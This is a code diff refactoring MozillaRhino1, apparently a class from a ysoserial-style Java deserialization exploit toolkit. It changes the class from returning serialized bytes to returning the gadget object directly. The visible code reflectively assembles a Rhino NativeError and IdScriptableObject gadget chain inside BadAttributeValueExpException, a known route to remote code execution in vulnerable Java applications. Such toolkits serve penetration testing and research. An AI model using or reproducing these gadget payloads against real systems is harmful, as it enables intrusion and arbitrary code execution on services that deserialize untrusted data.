@@ -16,7 +16,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
 public class MozillaRhino1 implements ObjectPayload<Object>{
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Class       nativeErrorClass       = Class.forName("org.mozilla.javascript.NativeError");
         Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
         Reflections.setAccessible(nativeErrorConstructor);
@@ -53,19 +53,7 @@ public class MozillaRhino1 implements ObjectPayload<Object>{
         Field                         valField                      = badAttributeValueExpException.getClass().getDeclaredField("val");
         Reflections.setAccessible(valField);
         valField.set(badAttributeValueExpException, idScriptableObject);
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(badAttributeValueExpException);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return badAttributeValueExpException;
     }
 
     public static boolean isApplicableJavaVersion() {
